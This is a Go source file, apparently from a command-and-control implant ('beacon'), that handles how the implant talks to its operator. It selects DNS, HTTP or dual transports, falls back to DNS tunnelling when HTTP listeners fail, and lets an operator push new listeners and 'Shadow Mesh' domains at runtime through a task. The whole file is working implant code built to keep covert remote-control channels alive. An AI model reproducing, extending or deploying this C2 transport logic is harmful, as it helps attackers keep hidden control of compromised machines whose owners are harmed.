// Package main implements transport selection for the beacon.
//
// A beacon runs in one of three modes:
//
//	dns  — DNS only. The default, and what every build made before HTTP
//	       transport existed does.
//	http — HTTP/HTTPS only. No DNS C2 traffic is generated at all.
//	dual — DNS carries only the task-readiness signal (the A record), and
//	       everything else goes over HTTP. If HTTP fails repeatedly the beacon
//	       falls back to the full DNS path until a probe succeeds.
//
// The mode and listener list are set at build time and can be replaced at
// runtime by an update_transport task, which is the same mechanism that carries
// Shadow Mesh domain updates.
package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"
)

// Transport modes.
const (
	transportDNS  = "dns"
	transportHTTP = "http"
	transportDual = "dual"
)

// Defaults for the dual-mode fallback behaviour.
const (
	defaultFallbackAfterFailures = 3
	defaultRetryBackoffSecs      = 60
)

// transportManager owns the transport decision and the live HTTP transports.
type transportManager struct {
	mu sync.RWMutex

	mode       string
	transports []*httpTransport
	c2Key      []byte

	// fallbackAfter is how many consecutive HTTP failures make a dual-mode
	// beacon use the DNS path.
	fallbackAfter int

	// backoff is how long a fallen-back beacon waits before probing HTTP again.
	backoff time.Duration

	// failures counts consecutive HTTP failures across all listeners.
	failures int

	// probing is true while HTTP is considered unhealthy; httpRetryAt is when
	// the next HTTP attempt is allowed.
	probing     bool
	httpRetryAt time.Time

	// lastErr records why HTTP is currently considered unhealthy, for the
	// task/result path to include in the fallback decision.
	lastErr error
}

// newTransportManager resolves configuration into a live transport manager.
//
// A listener that cannot be constructed is skipped rather than fatal: a beacon
// built with one bad endpoint but another working one should still run. If no
// listener can be built, an HTTP-requiring mode degrades to DNS, which the
// beacon reports through Mode() so the operator can see it in the beacon list.
func newTransportManager(cfg *Config, aesKey []byte) *transportManager {
	manager := &transportManager{
		mode:          normalizeTransportMode(cfg.Transport),
		fallbackAfter: cfg.HTTPFallbackAfterFailures,
		backoff:       time.Duration(cfg.HTTPRetryBackoffSecs) * time.Second,
		c2Key:         append([]byte(nil), aesKey...),
	}

	if manager.fallbackAfter <= 0 {
		manager.fallbackAfter = defaultFallbackAfterFailures
	}
	if manager.backoff <= 0 {
		manager.backoff = defaultRetryBackoffSecs * time.Second
	}

	for _, listener := range cfg.HTTPListeners {
		transport, err := newHTTPTransport(listener, aesKey)
		if err != nil {
			continue
		}
		manager.transports = append(manager.transports, transport)
	}

	if len(manager.transports) == 0 && manager.mode != transportDNS {
		manager.mode = transportDNS
	}

	return manager
}

// normalizeTransportMode maps a configured value onto a known mode, defaulting
// to DNS so an unset field keeps pre-HTTP behaviour.
func normalizeTransportMode(mode string) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case transportHTTP:
		return transportHTTP
	case transportDual:
		return transportDual
	default:
		return transportDNS
	}
}

// Mode returns the effective mode.
func (m *transportManager) Mode() string {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.mode
}

// ShouldUseHTTP reports whether the next exchange should go over HTTP.
//
// In dual mode this is false while HTTP is considered unhealthy, except once the
// backoff has elapsed, when one probe attempt is allowed so the beacon can
// return to HTTP without an operator action.
func (m *transportManager) ShouldUseHTTP() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()

	switch m.mode {
	case transportHTTP:
		return len(m.transports) > 0
	case transportDual:
		if !m.probing {
			return len(m.transports) > 0
		}
		return time.Now().After(m.httpRetryAt) && len(m.transports) > 0
	default:
		return false
	}
}

// Send delivers a protocol message over HTTP, trying each listener in order.
//
// Health is recorded here rather than by the caller so every HTTP exchange
// contributes to the fallback decision, including registrations and chunk
// fetches.
func (m *transportManager) Send(operation, message string) (string, error) {
	m.mu.RLock()
	transports := m.transports
	m.mu.RUnlock()

	if len(transports) == 0 {
		return "", fmt.Errorf("no HTTP listeners configured")
	}

	var firstErr error
	for _, transport := range transports {
		response, err := transport.send(operation, message)
		if err == nil {
			m.recordSuccess()
			return response, nil
		}
		if firstErr == nil {
			firstErr = err
		}
	}

	m.recordFailure(firstErr)
	return "", firstErr
}

// recordSuccess resets the failure counter and clears the fallen-back state.
func (m *transportManager) recordSuccess() {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.failures = 0
	m.probing = false
	m.lastErr = nil
}

// recordFailure counts a failure and, once the threshold is reached in dual
// mode, switches to the DNS path for the backoff window.
//
// In http mode there is no DNS path to fall back to, so failures are recorded
// but the mode does not change: the beacon keeps retrying rather than silently
// switching transports, which would surprise an operator who chose HTTP-only.
func (m *transportManager) recordFailure(err error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.failures++
	m.lastErr = err

	if m.mode != transportDual {
		return
	}
	if m.failures >= m.fallbackAfter {
		m.probing = true
		m.httpRetryAt = time.Now().Add(m.backoff)
	}
}

// FallbackActive reports whether a dual-mode beacon is currently using DNS
// because HTTP is unhealthy.
func (m *transportManager) FallbackActive() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.mode == transportDual && m.probing
}

// LastError returns why HTTP is unhealthy, or nil.
func (m *transportManager) LastError() error {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.lastErr
}

// transportUpdate is the runtime update payload carried by an
// update_transport task.
type transportUpdate struct {
	Mode                  string         `json:"mode"`
	Listeners             []HTTPListener `json:"listeners"`
	FallbackAfterFailures int            `json:"fallback_after_failures"`
	RetryBackoffSecs      int            `json:"retry_backoff_secs"`
}

// ApplyUpdate replaces the transport configuration at runtime.
//
// The update is applied atomically and only if it is usable: a payload naming an
// unknown mode, or one that produces no working listener for a mode that needs
// HTTP, leaves the current configuration in place. Silently degrading to DNS
// would take a beacon off HTTP because of a typo in an operator's payload.
func (m *transportManager) ApplyUpdate(payload string) error {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return fmt.Errorf("empty transport update")
	}

	var update transportUpdate
	if err := json.Unmarshal([]byte(payload), &update); err != nil {
		return fmt.Errorf("malformed transport update: %w", err)
	}

	mode := normalizeTransportMode(update.Mode)
	if mode != strings.ToLower(strings.TrimSpace(update.Mode)) {
		// The payload named a mode we do not implement.
		return fmt.Errorf("unknown transport mode %q", update.Mode)
	}

	m.mu.RLock()
	key := append([]byte(nil), m.c2Key...)
	m.mu.RUnlock()

	var transports []*httpTransport
	for _, listener := range update.Listeners {
		transport, err := newHTTPTransport(listener, key)
		if err != nil {
			continue
		}
		transports = append(transports, transport)
	}

	if mode != transportDNS && len(transports) == 0 {
		return fmt.Errorf("transport mode %q needs at least one usable listener", mode)
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	m.mode = mode
	m.transports = transports
	if update.FallbackAfterFailures > 0 {
		m.fallbackAfter = update.FallbackAfterFailures
	}
	if update.RetryBackoffSecs > 0 {
		m.backoff = time.Duration(update.RetryBackoffSecs) * time.Second
	}

	// A configuration change is a clean slate: the new endpoints deserve a
	// chance even if the old ones were failing.
	m.failures = 0
	m.probing = false
	m.lastErr = nil

	return nil
}
